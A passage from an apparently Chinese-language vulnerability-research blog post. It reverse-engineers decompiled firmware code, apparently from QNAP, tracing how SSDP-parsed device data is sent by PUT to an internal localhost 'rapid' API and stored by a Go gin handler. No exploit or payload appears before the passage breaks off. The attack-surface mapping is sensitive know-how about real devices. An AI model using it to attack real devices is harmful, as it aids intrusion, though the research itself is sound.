&#123;</span><br><span class="line">              lVar13 = *(<span class="type">long</span> *)(lVar1 + <span class="number">0x10</span>);</span><br><span class="line">              <span class="built_in">memset</span>(auStack_1800,<span class="number">0</span>,<span class="number">0x800</span>);</span><br><span class="line">              lVar2 = lVar13 + lVar10;</span><br><span class="line">              iVar3 = regular_expression(auStack_800,*(undefined8 *)(lVar13 + lVar10),auStack_1800,</span><br><span class="line">                                         <span class="number">0x800</span>);</span><br><span class="line">              <span class="keyword">if</span> (<span class="number">0</span> &lt; iVar3) &#123;</span><br><span class="line">                pcVar6 = *(<span class="type">char</span> **)(lVar2 + <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span> ((pcVar6 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (*pcVar6 == <span class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">                  update_dm_list(param_2,<span class="number">1</span>,*(undefined4 *)(lVar2 + <span class="number">0x10</span>),auStack_1800,</span><br><span class="line">                                 *(undefined4 *)(lVar2 + <span class="number">0x14</span>),*puVar12);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                  update_dm_list(param_2,<span class="number">1</span>,*(undefined4 *)(lVar2 + <span class="number">0x10</span>),pcVar6,</span><br><span class="line">                                 *(undefined4 *)(lVar2 + <span class="number">0x14</span>),*puVar12);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              iVar9 = iVar9 + <span class="number">1</span>;</span><br><span class="line">              lVar10 = lVar10 + <span class="number">0x18</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (iVar9 &lt; *(<span class="type">int</span> *)(lVar1 + <span class="number">8</span>));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        lVar11 = lVar11 + <span class="number">0x18</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((<span class="type">long</span>)iVar4 * <span class="number">0x18</span> != lVar11);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((((puVar5 != (undefined4 *)<span class="number">0x0</span>) &amp;&amp;</span><br><span class="line">         (pcVar6 = strcasestr(param_1,<span class="string">&quot;location:&quot;</span>), pcVar6 != (<span class="type">char</span> *)<span class="number">0x0</span>)) &amp;&amp;</span><br><span class="line">        (iVar4 = parse_ssdp_response_get_description(param_1,<span class="number">0x800</span>,&amp;local_1000,<span class="number">3</span>), iVar4 != <span class="number">-1</span>)) &amp;&amp;</span><br><span class="line">       (iVar4 = puVar5[<span class="number">1</span>], <span class="number">0</span> &lt; iVar4)) &#123;</span><br><span class="line">      lVar11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        lVar10 = *(<span class="type">long</span> *)(puVar5 + <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">memset</span>(auStack_800,<span class="number">0</span>,<span class="number">0x800</span>);</span><br><span class="line">        lVar1 = lVar10 + lVar11;</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack_1880,<span class="string">&quot;&lt;%s&gt;&quot;</span>,*(undefined8 *)(lVar10 + lVar11));</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack_1840,<span class="string">&quot;&lt;/%s&gt;&quot;</span>,*(undefined8 *)(lVar10 + lVar11));</span><br><span class="line">        sVar8 = <span class="built_in">strlen</span>(acStack_1880);</span><br><span class="line">        pcVar6 = strcasestr((<span class="type">char</span> *)&amp;local_1000,acStack_1880);</span><br><span class="line">        <span class="keyword">if</span> (pcVar6 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          pcVar6 = pcVar6 + sVar8;</span><br><span class="line">          pcVar7 = strcasestr(pcVar6,acStack_1840);</span><br><span class="line">          <span class="keyword">if</span> (pcVar7 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">            iVar9 = (<span class="type">int</span>)pcVar7 - (<span class="type">int</span>)pcVar6;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0x7ff</span> &lt; iVar9) &#123;</span><br><span class="line">              iVar9 = <span class="number">0x7ff</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memcpy</span>(auStack_800,pcVar6,(<span class="type">long</span>)iVar9);</span><br><span class="line">            auStack_800[iVar9] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt; *(<span class="type">int</span> *)(lVar1 + <span class="number">8</span>)) &#123;</span><br><span class="line">              lVar10 = <span class="number">0</span>;</span><br><span class="line">              iVar9 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">do</span> &#123;</span><br><span class="line">                lVar13 = *(<span class="type">long</span> *)(lVar1 + <span class="number">0x10</span>);</span><br><span class="line">                <span class="built_in">memset</span>(auStack_1800,<span class="number">0</span>,<span class="number">0x800</span>);</span><br><span class="line">                lVar2 = lVar13 + lVar10;</span><br><span class="line">                iVar3 = regular_expression(auStack_800,*(undefined8 *)(lVar13 + lVar10),auStack_1800</span><br><span class="line">                                           ,<span class="number">0x800</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> &lt; iVar3) &#123;</span><br><span class="line">                  pcVar6 = *(<span class="type">char</span> **)(lVar2 + <span class="number">8</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((pcVar6 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (*pcVar6 == <span class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">                    update_dm_list(param_2,<span class="number">1</span>,*(undefined4 *)(lVar2 + <span class="number">0x10</span>),auStack_1800,</span><br><span class="line">                                   *(undefined4 *)(lVar2 + <span class="number">0x14</span>),*puVar5);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span> &#123;</span><br><span class="line">                    update_dm_list(param_2,<span class="number">1</span>,*(undefined4 *)(lVar2 + <span class="number">0x10</span>),pcVar6,</span><br><span class="line">                                   *(undefined4 *)(lVar2 + <span class="number">0x14</span>),*puVar5);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                iVar9 = iVar9 + <span class="number">1</span>;</span><br><span class="line">                lVar10 = lVar10 + <span class="number">0x18</span>;</span><br><span class="line">              &#125; <span class="keyword">while</span> (iVar9 &lt; *(<span class="type">int</span> *)(lVar1 + <span class="number">8</span>));</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        lVar11 = lVar11 + <span class="number">0x18</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (lVar11 != (<span class="type">long</span>)iVar4 * <span class="number">0x18</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在这个函数中最后都会调用<code>update_dm_list</code>-&gt;<code>update_rest_api</code>, 处理数据并将数据发送到<code>rapid</code>服务</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">undefined8 <span class="title function_">update_rest_api</span><span class="params">(byte *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  </span><br><span class="line">  local_80 = <span class="number">0</span>;</span><br><span class="line">  uStack_78 = <span class="number">0</span>;</span><br><span class="line">  local_70 = <span class="number">0</span>;</span><br><span class="line">  uStack_68 = <span class="number">0</span>;</span><br><span class="line">  iVar2 = *(<span class="type">int</span> *)(param_1 + <span class="number">0x200</span>);</span><br><span class="line">  iVar1 = <span class="built_in">sprintf</span>((<span class="type">char</span> *)&amp;local_80,</span><br><span class="line">                  <span class="string">&quot;http://localhost:6666/apis/v1/scanned_devices/%c%c%c%c%c%c%c%c%c%c%c%c&quot;</span>,</span><br><span class="line">                  (ulong)*param_1,(ulong)param_1[<span class="number">1</span>],(ulong)param_1[<span class="number">3</span>],(ulong)param_1[<span class="number">4</span>],</span><br><span class="line">                  (ulong)param_1[<span class="number">6</span>],(ulong)param_1[<span class="number">7</span>],(uint)param_1[<span class="number">9</span>],(uint)param_1[<span class="number">10</span>],</span><br><span class="line">                  (uint)param_1[<span class="number">0xc</span>],(uint)param_1[<span class="number">0xd</span>],(uint)param_1[<span class="number">0xf</span>],(uint)param_1[<span class="number">0x10</span>]);</span><br><span class="line">  lVar3 = cJSON_CreateObject(iVar1);</span><br><span class="line">  lVar4 = cJSON_CreateObject();</span><br><span class="line">  <span class="keyword">if</span> (lVar4 == <span class="number">0</span> || lVar3 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (develop_mode == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (syslog_mode != <span class="number">0</span>) &#123;</span><br><span class="line">        syslog(<span class="number">7</span>,<span class="string">&quot;Create Json object fails\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Create Json object fails&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lVar3 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0x60</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;name&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0x14</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;os&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0xf0</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;type&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0x20</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;vendor&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0xb0</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;model&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0xa0</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;ip&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">0x1f8</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;weight_name&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">0x1f0</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;weight_os&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">0x204</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;weight_type&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">500</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;weight_vendor&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">0x200</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;weight_model&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">0x2b0</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;dhcp_count&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)*(<span class="type">int</span> *)(param_1 + <span class="number">0x2ab4</span>));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;ua_count&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0x1b0</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;nick_name&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(param_1 + <span class="number">0x170</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;customized_type&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateNumber((<span class="type">double</span>)(uint)(<span class="number">0xf9</span> &lt; iVar2));</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;confirm&quot;</span>,uVar5);</span><br><span class="line">    uVar5 = cJSON_CreateString(<span class="string">&quot;9000000&quot;</span>);</span><br><span class="line">    cJSON_AddItemToObject(lVar4,<span class="string">&quot;sid&quot;</span>,uVar5);</span><br><span class="line">    cJSON_AddItemToObject(lVar3,<span class="string">&quot;data&quot;</span>,lVar4);</span><br><span class="line">    __s = (<span class="type">char</span> *)cJSON_PrintUnformatted(lVar3);</span><br><span class="line">    lVar4 = curl_easy_init();</span><br><span class="line">    <span class="keyword">if</span> (lVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (develop_mode == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (syslog_mode != <span class="number">0</span>) &#123;</span><br><span class="line">          syslog(<span class="number">7</span>,<span class="string">&quot;curl_easy_init fails\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;curl_easy_init fails&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      curl_easy_setopt(lVar4,<span class="number">0x2734</span>,<span class="string">&quot;PUT&quot;</span>);</span><br><span class="line">      curl_easy_setopt(lVar4,<span class="number">0x2712</span>,&amp;local_80);</span><br><span class="line">      curl_easy_setopt(lVar4,<span class="number">0x271f</span>,__s);</span><br><span class="line">      iVar2 = curl_easy_perform(lVar4);</span><br><span class="line">      __stream = <span class="built_in">stderr</span>;</span><br><span class="line">      <span class="keyword">if</span> (iVar2 != <span class="number">0</span>) &#123;</span><br><span class="line">        uVar5 = curl_easy_strerror();</span><br><span class="line">        <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;update_rest_api failed: %s\n&quot;</span>,uVar5);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (develop_mode == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (syslog_mode != <span class="number">0</span>) &#123;</span><br><span class="line">          syslog(<span class="number">7</span>,<span class="string">&quot;%s\n&quot;</span>,__s);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_easy_cleanup(lVar4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(__s);</span><br><span class="line">        curl_easy_cleanup(lVar4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (__s != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(__s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cJSON_Delete(lVar3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>请求的url将是 PUT <a class="link"   target="_blank" rel="noopener" href="http://localhost:6666/apis/v1/scanned_devices/(MAC)" >http://localhost:6666/apis/v1/scanned_devices/(MAC)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 和jsondata</p>
</blockquote>
<blockquote>
<p>继续分析<code>rapid</code>服务, 该服务也是gin-web框架开发的所以我们快速的定位到<code>gitlab.lionic.com/qnap/rapid/server.(*Server).NewRouter</code>路由的定义并且来到我们处理scanned_devices路径的函数<code>gitlab.lionic.com/qnap/rapid/server.(*Server).PutScannedDevice</code>.</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> gitlab.lionic.com/qnap/rapid/server.(*Server).PutScannedDevice(<span class="type">int</span> param_1,<span class="type">int</span> param_2)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint4 *puVar1;</span><br><span class="line">  undefined *puVar2;</span><br><span class="line">  undefined4 *puVar3;</span><br><span class="line">  runtime._type *prVar4;</span><br><span class="line">  uint4 uVar5;</span><br><span class="line">  <span class="type">int</span> unaff_r10;</span><br><span class="line">  <span class="type">int</span> iVar6;</span><br><span class="line">  runtime._type *prVar7;</span><br><span class="line">  undefined4 *puVar8;</span><br><span class="line">  undefined *puVar9;</span><br><span class="line">  undefined *puVar10;</span><br><span class="line">  uint4 in_stack_ffffffbc;</span><br><span class="line">  uint4 uVar11;</span><br><span class="line">  undefined4 in_stack_ffffffc0;</span><br><span class="line">  undefined4 uVar12;</span><br><span class="line">  undefined4 in_stack_ffffffc4;</span><br><span class="line">  uint4 local_14;</span><br><span class="line">  runtime._type *local_10;</span><br><span class="line">  undefined4 local_c;</span><br><span class="line">  undefined4 local_8;</span><br><span class="line">  uint4 *local_4;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (&amp;stack0x00000000 &lt;= *(undefined **)(unaff_r10 + <span class="number">8</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  puVar3 = *(undefined4 **)(param_2 + <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  github.com/gin-gonic/gin.Params.Get</span><br><span class="line">            (*(undefined4 *)(param_2 + <span class="number">0x1c</span>),puVar3,*(undefined4 *)(param_2 + <span class="number">0x24</span>),&amp;DAT_00694fb5,<span class="number">3</span>,</span><br><span class="line">             in_stack_ffffffbc,in_stack_ffffffc0,in_stack_ffffffc4);<span class="comment">//[1]</span></span><br><span class="line">  uVar5 = in_stack_ffffffbc;</span><br><span class="line">  uVar12 = in_stack_ffffffc0;</span><br><span class="line"></span><br><span class="line">  runtime.newobject(&amp;datatype.Struct.struct_&#123;_Data_store.ScannedDevice_<span class="string">&quot;json:\&quot;data\&quot;&quot;</span>_&#125;,puVar3);</span><br><span class="line"></span><br><span class="line">  prVar7 = &amp;datatype.Ptr.*struct_&#123;_Data_store.ScannedDevice_<span class="string">&quot;json:\&quot;data\&quot;&quot;</span>_&#125;;</span><br><span class="line">  puVar9 = &amp;DAT_007a2418;</span><br><span class="line">  puVar10 = &amp;DAT_00bde528;</span><br><span class="line">  puVar8 = puVar3;</span><br><span class="line">  github.com/gin-gonic/gin.(*Context).MustBindWith</span><br><span class="line">            (param_2,&amp;datatype.Ptr.*struct_&#123;_Data_store.ScannedDevice_<span class="string">&quot;json:\&quot;data\&quot;&quot;</span>_&#125;,puVar3,</span><br><span class="line">             &amp;DAT_007a2418,&amp;DAT_00bde528,uVar5,uVar12); <span class="comment">//[2]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (uVar5 != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    iVar6 = param_2;</span><br><span class="line">    uVar11 = uVar5;</span><br><span class="line"></span><br><span class="line">    runtime.duffcopy_0x14_FUN_0006a43c((uint4 *)&amp;stack0xffffffac,(uint4 *)&amp;DAT_00bc55a0);</span><br><span class="line">    gitlab.lionic.com/qnap/rapid/server.Abort</span><br><span class="line">              (iVar6,prVar7,puVar8,puVar9,puVar10,uVar11,&amp;DAT_006a244c,<span class="number">0x18</span>,uVar5,uVar12);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  puVar1 = *(uint4 **)(param_1 + <span class="number">0x44</span>);</span><br><span class="line"></span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">15</span>]uint8,prVar7);</span><br><span class="line">  puVar9 = &amp;DAT_0069d12b;</span><br><span class="line">  prVar4 = prVar7;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    puVar2 = puVar9 + <span class="number">1</span>;</span><br><span class="line">    *(undefined *)&amp;prVar4-&gt;size = *puVar9;</span><br><span class="line">    puVar9 = puVar2;</span><br><span class="line">    prVar4 = (runtime._type *)((<span class="type">int</span>)&amp;prVar4-&gt;size + <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((<span class="type">int</span>)puVar2 &lt; <span class="number">0x69d13a</span>);</span><br><span class="line">  runtime.duffzero_0x0_0x14_FUN_0006a04c(&amp;local_14,<span class="number">0</span>);</span><br><span class="line">  local_14 = *puVar1;</span><br><span class="line">  local_c = <span class="number">0xf</span>;</span><br><span class="line">  local_8 = <span class="number">0xf</span>;</span><br><span class="line"></span><br><span class="line">  local_10 = prVar7;</span><br><span class="line">  local_4 = puVar1;</span><br><span class="line">  gitlab.lionic.com/qnap/rapid/store.(*ScannedDevicesCollection).Replace</span><br><span class="line">            ((<span class="type">int</span>)&amp;local_14,in_stack_ffffffbc,in_stack_ffffffc0,puVar3,puVar10,uVar5); <span class="comment">//[3]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (puVar10 != (undefined *)<span class="number">0x0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    iVar6 = param_2;</span><br><span class="line">    puVar9 = puVar10;</span><br><span class="line">    uVar11 = uVar5;</span><br><span class="line"></span><br><span class="line">    runtime.duffcopy_0x14_FUN_0006a43c((uint4 *)&amp;stack0xffffffac,(uint4 *)&amp;DAT_00bc55d0);</span><br><span class="line">    gitlab.lionic.com/qnap/rapid/server.Abort</span><br><span class="line">              (iVar6,in_stack_ffffffbc,in_stack_ffffffc0,puVar3,puVar9,uVar11,<span class="number">0</span>,<span class="number">0</span>,puVar10,uVar5);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  runtime.newobject(&amp;datatype.Struct.struct_&#123;&#125;,in_stack_ffffffbc);</span><br><span class="line">  gitlab.lionic.com/qnap/rapid/server.JSON(param_2,<span class="number">200</span>,&amp;datatype.Ptr.*struct_&#123;&#125;,in_stack_ffffffbc);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>首先会在[1],[2]处获取MAC和JSON数据, 并进入[3]<code>Replace</code>函数, 至于Replace过于混乱了就不显示出来了, 最后是调用了<code>gitlab.lionic.com/qnap/rapid/store.(*Collection).Replace</code></p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> gitlab.lionic.com/qnap/rapid/store.(*Collection).Replace</span><br><span class="line">               (undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,</span><br><span class="line">               undefined4 param_5,undefined4 param_6)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> unaff_r10;</span><br><span class="line">  undefined4 in_stack_ffffffe4;</span><br><span class="line">  undefined4 in_stack_ffffffe8;</span><br><span class="line">  code *local_14;</span><br><span class="line">  undefined4 *local_10;</span><br><span class="line">  undefined4 